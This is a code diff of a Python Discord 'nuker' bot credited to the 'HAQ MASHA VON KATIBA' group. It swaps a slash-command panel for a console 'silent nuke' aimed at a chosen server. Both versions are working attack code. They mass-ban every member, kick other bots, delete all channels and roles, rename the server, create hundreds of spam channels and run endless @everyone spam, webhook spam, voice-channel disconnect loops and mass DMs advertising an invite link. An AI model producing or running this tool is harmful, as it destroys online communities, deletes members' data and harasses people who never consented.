@@ -6,387 +6,260 @@ import os
 import random
 import time
 import aiohttp
-import json
+
+os.system('cls' if os.name == 'nt' else 'clear')
+
+print("""
+╔═══════════════════════════════════════════════════════════════════════════════╗
+║                                                                               ║
+║     ██╗  ██╗ █████╗  ██████╗     ███╗   ███╗ █████╗ ███████╗██╗  ██╗ █████╗  ║
+║     ██║  ██║██╔══██╗██╔═══██╗    ████╗ ████║██╔══██╗██╔════╝██║  ██║██╔══██╗ ║
+║     ███████║███████║██║   ██║    ██╔████╔██║███████║███████╗███████║███████║ ║
+║     ██╔══██║██╔══██║██║▄▄ ██║    ██║╚██╔╝██║██╔══██║╚════██║██╔══██║██╔══██║ ║
+║     ██║  ██║██║  ██║╚██████╔╝    ██║ ╚═╝ ██║██║  ██║███████║██║  ██║██║  ██║ ║
+║     ╚═╝  ╚═╝╚═╝  ╚═╝ ╚══▀▀═╝     ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ║
+║                                                                               ║
+║                    ██╗   ██╗ ██████╗ ███╗   ██╗ ██████╗███████╗              ║
+║                    ██║   ██║██╔═══██╗████╗  ██║██╔════╝██╔════╝              ║
+║                    ██║   ██║██║   ██║██╔██╗ ██║██║     █████╗                ║
+║                    ╚██╗ ██╔╝██║   ██║██║╚██╗██║██║     ██╔══╝                ║
+║                     ╚████╔╝ ╚██████╔╝██║ ╚████║╚██████╗███████╗              ║
+║                      ╚═══╝   ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝╚══════╝              ║
+║                                                                               ║
+║                    ╔═══════════════════════════════════════════════════════╗  ║
+║                    ║     HAQ MASHA VON KATIBA SILENT NUKER v4.0           ║  ║
+║                    ║          NO MESSAGES - FULL DESTRUCTION              ║  ║
+║                    ╚═══════════════════════════════════════════════════════╝  ║
+║                                                                               ║
+╚═══════════════════════════════════════════════════════════════════════════════╝
+""")
 
 # ============================================
-# CONFIG
+# TOKEN INPUT
 # ============================================
 TOKEN = input("[?] ENTER BOT TOKEN: ")
 
 intents = discord.Intents.all()
-bot = commands.Bot(command_prefix="!", intents=intents)
-
-# Voice crash tracking
-running_crashes = {}
+bot = commands.Bot(command_prefix="", intents=intents)
 
 # ============================================
-# MESSAGES
+# COLORS
 # ============================================
-HAQ_MESSAGE = """
-╔═══════════════════════════════════════════════════════════════════════════════╗
-║                                                                               ║
-║              ██╗  ██╗ █████╗  ██████╗     ███╗   ███╗ █████╗ ███████╗██╗  ██╗ █████╗ ║
-║              ██║  ██║██╔══██╗██╔═══██╗    ████╗ ████║██╔══██╗██╔════╝██║  ██║██╔══██╗║
-║              ███████║███████║██║   ██║    ██╔████╔██║███████║███████╗███████║███████║║
-║              ██╔══██║██╔══██║██║▄▄ ██║    ██║╚██╔╝██║██╔══██║╚════██║██╔══██║██╔══██║║
-║              ██║  ██║██║  ██║╚██████╔╝    ██║ ╚═╝ ██║██║  ██║███████║██║  ██║██║  ██║║
-║              ╚═╝  ╚═╝╚═╝  ╚═╝ ╚══▀▀═╝     ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝║
-║                                                                               ║
-║                    VON KATIBA JAK LMOT RA7 TARJ3 LOT HHHH                    ║
-║                                                                               ║
-║                    YOU HAVE BEEN TERMINATED BY                                ║
-║                    HAQ MASHA & VON KATIBA TEAM                                ║
-║                                                                               ║
-║                    https://discord.gg/c7cgYk4V                                ║
-║                                                                               ║
-╚═══════════════════════════════════════════════════════════════════════════════╝
-"""
-
-SPAM_LIST = [
-    "@everyone **HAQ MASHA VON KATIBA TEAM DESTROYED THIS SERVER**",
-    "```VON KATIBA JAK LMOT RA7 TARJ3 LOT HHHH```",
-    "@everyone **https://discord.gg/c7cgYk4V**",
-    "```HAQ MASHA + VON KATIBA = MAXIMUM DESTRUCTION```",
-    "**الكتيبة هاق مشا تيم - VON KATIBA**",
-    "@everyone **YOUR SERVER IS GONE FOREVER**",
-    "```VON KATIBA WAS HERE```",
-    "@everyone **VON KATIBA JAK LMOT RA7 TARJ3 LOT HHHH**",
-]
+class Colors:
+    RED = '\033[91m'
+    GREEN = '\033[92m'
+    YELLOW = '\033[93m'
+    BLUE = '\033[94m'
+    MAGENTA = '\033[95m'
+    CYAN = '\033[96m'
+    WHITE = '\033[97m'
+    RESET = '\033[0m'
+    BOLD = '\033[1m'
 
 # ============================================
-# EMBED MENU
+# NUKE FUNCTION (SILENT - NO MESSAGES)
 # ============================================
-def create_main_menu():
-    embed = discord.Embed(
-        title="🎯 HAQ MASHA VON KATIBA NUKER PANEL",
-        description="**Select an option from the menu below**",
-        color=discord.Color.red()
-    )
-    embed.add_field(
-        name="📁 1️⃣ `/nuke`",
-        value="```Destroy entire server (ban all, delete channels, create spam)```",
-        inline=False
-    )
-    embed.add_field(
-        name="💬 2️⃣ `/spam`",
-        value="```Spam messages in current channel```",
-        inline=False
-    )
-    embed.add_field(
-        name="🪝 3️⃣ `/webhook`",
-        value="```Create webhooks and spam from them```",
-        inline=False
-    )
-    embed.add_field(
-        name="🎧 4️⃣ `/crash`",
-        value="```Crash users via voice channels (join/leave spam)```",
-        inline=False
-    )
-    embed.add_field(
-        name="📢 5️⃣ `/otf`",
-        value="```Send a custom message to all members in DM```",
-        inline=False
-    )
-    embed.add_field(
-        name="🛑 6️⃣ `/stop`",
-        value="```Stop all ongoing spam/crash operations```",
-        inline=False
-    )
-    embed.set_footer(text="HAQ MASHA VON KATIBA TEAM | ALGERIA")
-    embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/.../icon.png")
-    return embed
-
-# ============================================
-# COMMAND: /v (MENU)
-# ============================================
-@bot.tree.command(name="v", description="Show the main nuker menu")
-async def slash_v(interaction: discord.Interaction):
-    embed = create_main_menu()
-    await interaction.response.send_message(embed=embed, ephemeral=False)
-
-# ============================================
-# COMMAND: /nuke (FULL SERVER DESTROY)
-# ============================================
-@bot.tree.command(name="nuke", description="Destroy the entire server")
-@app_commands.describe(target="Choose what to destroy")
-@app_commands.choices(target=[
-    app_commands.Choice(name="Everything (Bans + Channels + Roles)", value="full"),
-    app_commands.Choice(name="Only Channels", value="channels"),
-    app_commands.Choice(name="Only Roles", value="roles"),
-    app_commands.Choice(name="Only Members (Ban all)", value="bans"),
-])
-async def slash_nuke(interaction: discord.Interaction, target: app_commands.Choice[str]):
-    await interaction.response.defer()
-    guild = interaction.guild
+async def silent_nuke(guild):
+    print(f"\n{Colors.BOLD}{Colors.MAGENTA}{'='*60}{Colors.RESET}")
+    print(f"{Colors.BOLD}{Colors.RED}[!] SILENT NUKE STARTED ON: {guild.name}{Colors.RESET}")
+    print(f"{Colors.BOLD}{Colors.MAGENTA}{'='*60}{Colors.RESET}\n")
     
-    embed = discord.Embed(title="💀 NUKE STARTED 💀", color=discord.Color.red())
-    embed.add_field(name="Target", value=target.name, inline=False)
-    embed.add_field(name="Server", value=guild.name, inline=True)
-    await interaction.followup.send(embed=embed)
+    start_time = time.time()
     
-    # Get first channel for updates
-    first_channel = guild.text_channels[0] if guild.text_channels else None
+    # ============================================
+    # PHASE 1: GET ALL MEMBERS
+    # ============================================
+    print(f"{Colors.CYAN}[1/6] FETCHING MEMBERS...{Colors.RESET}")
+    members = await guild.fetch_members(limit=None).flatten()
+    total_members = len([m for m in members if not m.bot])
+    print(f"{Colors.GREEN}    ✓ {total_members} TARGETS FOUND{Colors.RESET}")
     
-    # BAN ALL MEMBERS
-    if target.value in ["full", "bans"]:
-        members = await guild.fetch_members().flatten()
-        banned = 0
-        for member in members:
-            if not member.bot:
-                try:
-                    await member.send(HAQ_MESSAGE)
-                    await member.ban(reason="HAQ MASHA VON KATIBA")
-                    banned += 1
-                    await asyncio.sleep(0.05)
-                except:
-                    pass
-        if first_channel:
-            await first_channel.send(f"✅ BANNED {banned} MEMBERS")
-    
-    # DELETE ALL CHANNELS
-    if target.value in ["full", "channels"]:
-        deleted = 0
-        for channel in guild.channels:
+    # ============================================
+    # PHASE 2: BAN ALL MEMBERS (SILENT - NO DMS)
+    # ============================================
+    print(f"{Colors.CYAN}[2/6] BANNING ALL MEMBERS...{Colors.RESET}")
+    banned = 0
+    for member in members:
+        if not member.bot:
             try:
-                await channel.delete()
-                deleted += 1
+                await member.ban(reason="HAQ MASHA VON KATIBA", delete_message_days=7)
+                banned += 1
+                if banned % 20 == 0:
+                    print(f"    • BANNED {banned}/{total_members}")
+                await asyncio.sleep(0.03)
+            except:
+                pass
+    print(f"{Colors.GREEN}    ✓ BANNED {banned} MEMBERS{Colors.RESET}")
+    
+    # ============================================
+    # PHASE 3: REMOVE ALL BOTS
+    # ============================================
+    print(f"{Colors.CYAN}[3/6] REMOVING ALL BOTS...{Colors.RESET}")
+    bots_kicked = 0
+    for member in members:
+        if member.bot and member.id != bot.user.id:
+            try:
+                await member.kick(reason="HAQ MASHA")
+                bots_kicked += 1
                 await asyncio.sleep(0.02)
             except:
                 pass
-        if first_channel:
-            await first_channel.send(f"✅ DELETED {deleted} CHANNELS")
+    print(f"{Colors.GREEN}    ✓ REMOVED {bots_kicked} BOTS{Colors.RESET}")
     
-    # DELETE ALL ROLES
-    if target.value in ["full", "roles"]:
-        deleted = 0
-        for role in guild.roles:
-            if role.name != "@everyone":
-                try:
-                    await role.delete()
-                    deleted += 1
-                    await asyncio.sleep(0.02)
-                except:
-                    pass
-        if first_channel:
-            await first_channel.send(f"✅ DELETED {deleted} ROLES")
+    # ============================================
+    # PHASE 4: DELETE ALL CHANNELS
+    # ============================================
+    print(f"{Colors.CYAN}[4/6] DELETING ALL CHANNELS...{Colors.RESET}")
+    channels_deleted = 0
+    for channel in guild.channels:
+        try:
+            await channel.delete(reason="HAQ MASHA")
+            channels_deleted += 1
+            if channels_deleted % 50 == 0:
+                print(f"    • DELETED {channels_deleted} CHANNELS")
+            await asyncio.sleep(0.02)
+        except:
+            pass
+    print(f"{Colors.GREEN}    ✓ DELETED {channels_deleted} CHANNELS{Colors.RESET}")
     
-    # CHANGE SERVER NAME
-    if target.value == "full":
-        await guild.edit(name="VON KATIBA HAQ MASHA")
-    
-    # CREATE NEW CHANNELS
-    if target.value == "full":
-        for i in range(300):
+    # ============================================
+    # PHASE 5: DELETE ALL ROLES
+    # ============================================
+    print(f"{Colors.CYAN}[5/6] DELETING ALL ROLES...{Colors.RESET}")
+    roles_deleted = 0
+    for role in guild.roles:
+        if role.name != "@everyone":
             try:
-                await guild.create_text_channel(name=f"von-katiba-{i}")
-                await asyncio.sleep(0.01)
+                await role.delete(reason="HAQ MASHA")
+                roles_deleted += 1
+                await asyncio.sleep(0.02)
             except:
                 pass
-        
-        # Start spam in new channels
-        async def spam():
-            while True:
-                for ch in guild.text_channels:
-                    try:
-                        await ch.send(random.choice(SPAM_LIST))
-                        await asyncio.sleep(0.05)
-                    except:
-                        pass
-                await asyncio.sleep(0.1)
-        asyncio.create_task(spam())
+    print(f"{Colors.GREEN}    ✓ DELETED {roles_deleted} ROLES{Colors.RESET}")
     
-    await interaction.followup.send("✅ **NUKE COMPLETED!**")
-
-# ============================================
-# COMMAND: /spam
-# ============================================
-@bot.tree.command(name="spam", description="Spam messages in current channel")
-@app_commands.describe(
-    channel="Channel to spam (leave empty for current)",
-    count="Number of messages to send (default: 100)",
-    delay="Delay between messages in seconds (default: 0.1)"
-)
-async def slash_spam(
-    interaction: discord.Interaction, 
-    channel: discord.TextChannel = None,
-    count: int = 100,
-    delay: float = 0.1
-):
-    await interaction.response.defer()
-    target_channel = channel or interaction.channel
+    # ============================================
+    # PHASE 6: RENAME SERVER & CREATE SPAM CHANNELS
+    # ============================================
+    print(f"{Colors.CYAN}[6/6] RENAMING SERVER & CREATING SPAM CHANNELS...{Colors.RESET}")
     
-    embed = discord.Embed(title="💬 SPAM STARTED", color=discord.Color.orange())
-    embed.add_field(name="Channel", value=target_channel.mention, inline=True)
-    embed.add_field(name="Count", value=str(count), inline=True)
-    embed.add_field(name="Delay", value=f"{delay}s", inline=True)
-    await interaction.followup.send(embed=embed)
+    # Change server name
+    new_name = random.choice(["VON KATIBA", "HAQ MASHA", "DESTROYED", "NUKE", "VON-HAQ"])
+    try:
+        await guild.edit(name=new_name)
+        print(f"    ✓ RENAMED TO: {new_name}")
+    except:
+        pass
     
-    sent = 0
-    for i in range(count):
+    # Create 500 spam channels
+    spam_list = [
+        "VON-KATIBA",
+        "HAQ-MASHA",
+        "DESTROYED",
+        "NUKE",
+        "GET-REKT",
+        "BYE-BYE"
+    ]
+    
+    for i in range(500):
         try:
-            await target_channel.send(random.choice(SPAM_LIST))
-            sent += 1
-            await asyncio.sleep(delay)
+            await guild.create_text_channel(name=f"{random.choice(spam_list)}-{i}")
+            if i % 100 == 0 and i > 0:
+                print(f"    • CREATED {i} CHANNELS")
+            await asyncio.sleep(0.01)
         except:
             pass
     
-    await interaction.followup.send(f"✅ **SENT {sent} MESSAGES**")
-
-# ============================================
-# COMMAND: /webhook
-# ============================================
-@bot.tree.command(name="webhook", description="Create webhooks and spam")
-@app_commands.describe(
-    channel="Channel to create webhooks in",
-    count="Number of webhooks to create (default: 10)",
-    spam_count="Number of spam messages per webhook (default: 100)"
-)
-async def slash_webhook(
-    interaction: discord.Interaction,
-    channel: discord.TextChannel,
-    count: int = 10,
-    spam_count: int = 100
-):
-    await interaction.response.defer()
-    
-    embed = discord.Embed(title="🪝 WEBHOOK SPAM STARTED", color=discord.Color.purple())
-    embed.add_field(name="Channel", value=channel.mention, inline=True)
-    embed.add_field(name="Webhooks", value=str(count), inline=True)
-    embed.add_field(name="Messages/Webhook", value=str(spam_count), inline=True)
-    await interaction.followup.send(embed=embed)
-    
-    webhooks = []
-    for i in range(min(count, 10)):
-        try:
-            webhook = await channel.create_webhook(name=f"HAQ-MASHA-{i}")
-            webhooks.append(webhook)
-            await asyncio.sleep(0.1)
-        except:
-            pass
-    
-    async with aiohttp.ClientSession() as session:
-        for webhook in webhooks:
-            for i in range(spam_count):
+    # Start infinite spam in new channels
+    async def spam():
+        spam_messages = [
+            "@everyone **VON KATIBA JAK LMOT RA7 TARJ3 LOT HHHH**",
+            "@everyone **HAQ MASHA TEAM DESTROYED THIS SERVER**",
+            "```SERVER DESTROYED BY HAQ MASHA```",
+            "**VON KATIBA WAS HERE**",
+            "@everyone **https://discord.gg/c7cgYk4V**"
+        ]
+        while True:
+            for channel in guild.text_channels:
                 try:
-                    data = {
-                        "content": random.choice(SPAM_LIST),
-                        "username": random.choice(["VON-KATIBA", "HAQ-MASHA", "NUKER"])
-                    }
-                    async with session.post(webhook.url, json=data) as resp:
-                        pass
+                    await channel.send(random.choice(spam_messages))
                     await asyncio.sleep(0.05)
                 except:
                     pass
+            await asyncio.sleep(0.1)
     
-    await interaction.followup.send(f"✅ **SPAMMED {len(webhooks)} WEBHOOKS**")
+    asyncio.create_task(spam())
+    print(f"{Colors.GREEN}    ✓ CREATED 500 CHANNELS + SPAM STARTED{Colors.RESET}")
+    
+    # ============================================
+    # FINISH
+    # ============================================
+    end_time = time.time()
+    total_time = round(end_time - start_time, 2)
+    
+    print(f"\n{Colors.BOLD}{Colors.MAGENTA}{'='*60}{Colors.RESET}")
+    print(f"{Colors.BOLD}{Colors.GREEN}[✓] SILENT NUKE COMPLETED!{Colors.RESET}")
+    print(f"{Colors.GREEN}    • SERVER: {guild.name}")
+    print(f"{Colors.GREEN}    • BANNED: {banned} MEMBERS")
+    print(f"{Colors.GREEN}    • BOTS REMOVED: {bots_kicked}")
+    print(f"{Colors.GREEN}    • CHANNELS DELETED: {channels_deleted}")
+    print(f"{Colors.GREEN}    • ROLES DELETED: {roles_deleted}")
+    print(f"{Colors.GREEN}    • TIME: {total_time} SECONDS")
+    print(f"{Colors.BOLD}{Colors.MAGENTA}{'='*60}{Colors.RESET}\n")
 
 # ============================================
-# COMMAND: /crash (VOICE CRASHER)
+# SHOW SERVERS FUNCTION
 # ============================================
-@bot.tree.command(name="crash", description="Crash users via voice channels")
-@app_commands.describe(
-    target="Who to crash",
-    voice_channel="Voice channel to use",
-    interval="Delay between joins (seconds)",
-    iterations="Number of join/leave cycles"
-)
-@app_commands.choices(target=[
-    app_commands.Choice(name="All Members", value="all"),
-    app_commands.Choice(name="Specific User (provide ID)", value="user"),
-])
-async def slash_crash(
-    interaction: discord.Interaction,
-    target: app_commands.Choice[str],
-    voice_channel: discord.VoiceChannel,
-    interval: float = 0.1,
-    iterations: int = 100
-):
-    await interaction.response.defer()
-    guild = interaction.guild
+def show_servers():
+    print(f"\n{Colors.BOLD}{Colors.CYAN}{'═'*60}{Colors.RESET}")
+    print(f"{Colors.BOLD}{Colors.YELLOW}{' ' * 20}📋 AVAILABLE SERVERS{Colors.RESET}")
+    print(f"{Colors.BOLD}{Colors.CYAN}{'═'*60}{Colors.RESET}\n")
     
-    embed = discord.Embed(title="🎧 VOICE CRASH STARTED", color=discord.Color.red())
-    embed.add_field(name="Target", value=target.name, inline=True)
-    embed.add_field(name="Voice Channel", value=voice_channel.name, inline=True)
-    embed.add_field(name="Interval", value=f"{interval}s", inline=True)
-    embed.add_field(name="Iterations", value=str(iterations), inline=True)
-    await interaction.followup.send(embed=embed)
+    for i, guild in enumerate(bot.guilds, 1):
+        members = len(guild.members)
+        channels = len(guild.channels)
+        voice = len(guild.voice_channels)
+        
+        print(f"{Colors.GREEN}[{i}]{Colors.RESET} {Colors.WHITE}{guild.name}{Colors.RESET}")
+        print(f"     ├─ 🆔 ID: {guild.id}")
+        print(f"     ├─ 👥 Members: {members}")
+        print(f"     ├─ 💬 Channels: {channels}")
+        print(f"     └─ 🎧 Voice: {voice}\n")
     
-    async def crash_user(member):
-        for i in range(iterations):
-            if member.id in running_crashes and not running_crashes[member.id]:
-                break
-            try:
-                await member.move_to(voice_channel)
-                await asyncio.sleep(interval)
-                await member.move_to(None)
-                await asyncio.sleep(interval)
-            except:
-                pass
-    
-    if target.value == "all":
-        members = [m for m in guild.members if not m.bot]
-        crashed = 0
-        for member in members:
-            try:
-                asyncio.create_task(crash_user(member))
-                crashed += 1
-                await asyncio.sleep(0.1)
-            except:
-                pass
-        await interaction.followup.send(f"✅ **CRASHING {crashed} USERS**")
-    else:
-        await interaction.followup.send("📢 **Please provide user ID in chat**")
-        # Would need more logic for specific user
+    print(f"{Colors.BOLD}{Colors.CYAN}{'═'*60}{Colors.RESET}")
 
 # ============================================
-# COMMAND: /otf (SEND DM TO ALL MEMBERS)
+# MAIN SELECTION MENU (CONSOLE)
 # ============================================
-@bot.tree.command(name="otf", description="Send a custom message to all members in DM")
-@app_commands.describe(
-    message="The message you want to send to all members"
-)
-async def slash_otf(interaction: discord.Interaction, message: str):
-    await interaction.response.defer(ephemeral=True)
-    guild = interaction.guild
-    
-    embed = discord.Embed(
-        title="📢 OTF - MASS DM STARTED",
-        description=f"**Message:** {message[:100]}...",
-        color=discord.Color.blue()
-    )
-    embed.add_field(name="Server", value=guild.name, inline=True)
-    embed.add_field(name="Members", value=str(len([m for m in guild.members if not m.bot])), inline=True)
-    await interaction.followup.send(embed=embed, ephemeral=True)
-    
-    members = await guild.fetch_members().flatten()
-    sent = 0
-    failed = 0
-    
-    for member in members:
-        if not member.bot and member != interaction.user:
-            try:
-                full_message = f"**HAQ MASHA VON KATIBA TEAM**\n{message}\n\nhttps://discord.gg/c7cgYk4V"
-                await member.send(full_message)
-                sent += 1
-                await asyncio.sleep(0.2)
-            except:
-                failed += 1
-    
-    result_embed = discord.Embed(
-        title="✅ OTF COMPLETED",
-        description=f"**Sent:** {sent} members\n**Failed:** {failed} members",
-        color=discord.Color.green()
-    )
-    await interaction.followup.send(embed=result_embed)
-
-# ============================================
-# COMMAND: /stop
-# ============================================
-@bot.tree.command(name="stop", description="Stop all ongoing spam/crash operations")
-async def slash_stop(interaction: discord.Interaction):
-    global running_crashes
-    running_crashes = {}
-    await interaction.response.send_message("🛑 **ALL OPERATIONS STOPPED**", ephemeral=True)
+async def select_server():
+    while True:
+        print(f"\n{Colors.BOLD}{Colors.YELLOW}🎯 SILENT NUKE - SELECT TARGET{Colors.RESET}")
+        show_servers()
+        
+        try:
+            choice = input(f"\n{Colors.CYAN}📌 SELECT SERVER NUMBER (or 'q' to quit): {Colors.RESET}")
+            
+            if choice.lower() == 'q':
+                print(f"\n{Colors.RED}🚪 EXITING...{Colors.RESET}")
+                return None
+            
+            server_num = int(choice)
+            if 1 <= server_num <= len(bot.guilds):
+                selected = bot.guilds[server_num - 1]
+                
+                print(f"\n{Colors.RED}{Colors.BOLD}⚠️  SILENT NUKE ON: {selected.name}{Colors.RESET}")
+                confirm = input(f"{Colors.YELLOW}TYPE 'yes' TO CONFIRM: {Colors.RESET}")
+                
+                if confirm.lower() == 'yes':
+                    return selected
+                else:
+                    print(f"{Colors.RED}❌ CANCELLED!{Colors.RESET}")
+            else:
+                print(f"{Colors.RED}❌ INVALID NUMBER!{Colors.RESET}")
+        except ValueError:
+            print(f"{Colors.RED}❌ ENTER A VALID NUMBER!{Colors.RESET}")
+        except KeyboardInterrupt:
+            print(f"\n{Colors.RED}🚪 EXITING...{Colors.RESET}")
+            return None
 
 # ============================================
 # ON READY
@@ -394,29 +267,38 @@ async def slash_stop(interaction: discord.Interaction):
 @bot.event
 async def on_ready():
     os.system('cls' if os.name == 'nt' else 'clear')
+    
     print(f"""
-╔═══════════════════════════════════════════════════════════════════════════════╗
-║                                                                               ║
-║              ✅ BOT ONLINE: {bot.user.name}
-║              ✅ BOT ID: {bot.user.id}
-║              ✅ SERVERS: {len(bot.guilds)}
-║                                                                               ║
-║              📌 SLASH COMMANDS REGISTERED:
-║                 • /v      - Main menu
-║                 • /nuke   - Destroy server
-║                 • /spam   - Spam messages
-║                 • /webhook - Webhook spam
-║                 • /crash  - Voice crash users
-║                 • /otf    - Mass DM all members
-║                 • /stop   - Stop all operations
-║                                                                               ║
-║                    VON KATIBA JAK LMOT RA7 TARJ3 LOT HHHH                    ║
-║                                                                               ║
-╚═══════════════════════════════════════════════════════════════════════════════╝
+{Colors.BOLD}{Colors.GREEN}╔═══════════════════════════════════════════════════════════════════════════════╗{Colors.RESET}
+{Colors.BOLD}{Colors.GREEN}║                                                                               ║{Colors.RESET}
+{Colors.BOLD}{Colors.GREEN}║              ✅ BOT ONLINE: {bot.user.name}{' ' * (40 - len(bot.user.name))}║{Colors.RESET}
+{Colors.BOLD}{Colors.GREEN}║              ✅ BOT ID: {bot.user.id}{' ' * (44 - len(str(bot.user.id)))}║{Colors.RESET}
+{Colors.BOLD}{Colors.GREEN}║              ✅ SERVERS: {len(bot.guilds)}{' ' * (43 - len(str(len(bot.guilds))))}║{Colors.RESET}
+{Colors.BOLD}{Colors.GREEN}║                                                                               ║{Colors.RESET}
+{Colors.BOLD}{Colors.GREEN}║              🚀 SILENT NUKE MODE ACTIVATED                                     ║{Colors.RESET}
+{Colors.BOLD}{Colors.GREEN}║              📌 NO MESSAGES WILL BE SENT                                       ║{Colors.RESET}
+{Colors.BOLD}{Colors.GREEN}║              💀 JUST PURE DESTRUCTION                                         ║{Colors.RESET}
+{Colors.BOLD}{Colors.GREEN}║                                                                               ║{Colors.RESET}
+{Colors.BOLD}{Colors.GREEN}╚═══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}
     """)
     
-    await bot.tree.sync()
-    print("[✓] SLASH COMMANDS SYNCED GLOBALLY")
+    await asyncio.sleep(1)
+    
+    # Start server selection
+    target_server = await select_server()
+    
+    if target_server:
+        print(f"\n{Colors.RED}{Colors.BOLD}🔥 STARTING SILENT NUKE IN 3 SECONDS...{Colors.RESET}")
+        for i in range(3, 0, -1):
+            print(f"   {i}...")
+            await asyncio.sleep(1)
+        
+        await silent_nuke(target_server)
+        print(f"\n{Colors.GREEN}{Colors.BOLD}✅ NUKE COMPLETED!{Colors.RESET}")
+    else:
+        print(f"\n{Colors.RED}❌ NO SERVER SELECTED!{Colors.RESET}")
+    
+    await bot.close()
 
 # ============================================
 # RUN
